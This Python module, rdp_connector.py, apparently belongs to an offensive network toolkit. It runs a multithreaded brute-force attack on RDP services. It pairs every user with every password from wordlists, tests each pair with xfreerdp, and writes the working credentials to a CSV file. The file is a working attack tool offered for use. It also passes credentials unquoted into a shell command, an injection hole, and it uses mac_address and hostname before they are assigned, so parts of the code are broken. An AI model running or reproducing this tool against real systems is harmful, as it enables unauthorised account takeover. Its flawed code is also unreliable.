"""
rdp_connector.py - This script performs a brute force attack on RDP services (port 3389) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import pandas as pd
import subprocess
import threading
import logging
import time
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

# Configure the logger
logger = Logger(name="rdp_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "RDPBruteforce"
b_module = "rdp_connector"
b_status = "brute_force_rdp"
b_port = 3389
b_parent = None

class RDPBruteforce:
    """
    Class to handle the RDP brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.rdp_connector = RDPConnector(shared_data)
        logger.info("RDPConnector initialized.")

    def bruteforce_rdp(self, ip, port):
        """
        Run the RDP brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_rdp on {ip}:{port}...")
        return self.rdp_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        Optimization: Skip bruteforce if valid credentials already exist for this host.
        """
        logger.info(f"Executing RDPBruteforce on {ip}:{port}...")
        
        # Check if we already have valid credentials for this host
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.rdpfile, ip
        )
        if existing_creds:
            logger.info(f"RDP credentials already exist for {ip} - verifying instead of bruteforcing...")
            # Verify credentials still work
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing RDP credentials verified for {ip}: {len(existing_creds)} account(s)")
                return 'success'
            else:
                logger.warning(f"Existing credentials for {ip} no longer valid, will re-bruteforce")
        
        self.shared_data.ragnarorch_status = "RDPBruteforce"
        success, results = self.bruteforce_rdp(ip, port)
        return 'success' if success else 'failed'
    
    def _verify_credentials(self, ip, credentials):
        """Verify that existing credentials still work (quick check)."""
        for user, password in credentials:
            if self.rdp_connector.rdp_connect(ip, user, password):
                logger.debug(f"Verified RDP credential for {ip}: {user}")
                return True
        return False

class RDPConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        
        # Read from SQLite via shared_data (no more CSV)
        try:
            data = shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
        except Exception as e:
            logger.warning(f"Could not read data from database: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])
        # Ensure Ports column is string type before using .str accessor
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("3389", na=False)]

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.rdpfile = shared_data.rdpfile
        # If the file doesn't exist, it will be created
        if not os.path.exists(self.rdpfile):
            logger.info(f"File {self.rdpfile} does not exist. Creating...")
            with open(self.rdpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load from SQLite database and filter for RDP ports.
        """
        data = self.shared_data.read_data()
        self.scan = pd.DataFrame(data)
        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("3389", na=False)]

    def rdp_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an RDP service using the given credentials.
        """
        command = f"xfreerdp /v:{adresse_ip} /u:{user} /p:{password} /cert:ignore +auth-only"
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                return True
            else:
                return False
        except subprocess.SubprocessError as e:
            return False

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.rdp_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        total_tasks = len(self.users) * len(self.passwords)
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing RDP...", total=total_tasks)

            mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
            hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]

            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
        df.to_csv(self.rdpfile, index=False, mode='a', header=not os.path.exists(self.rdpfile))
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        df = pd.read_csv(self.rdpfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.rdpfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        rdp_bruteforce = RDPBruteforce(shared_data)
        logger.info("Démarrage de l'attaque RDP... sur le port 3389")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing RDPBruteforce on {ip}...")
            rdp_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Nombre total de succès: {len(rdp_bruteforce.rdp_connector.results)}")
        exit(len(rdp_bruteforce.rdp_connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
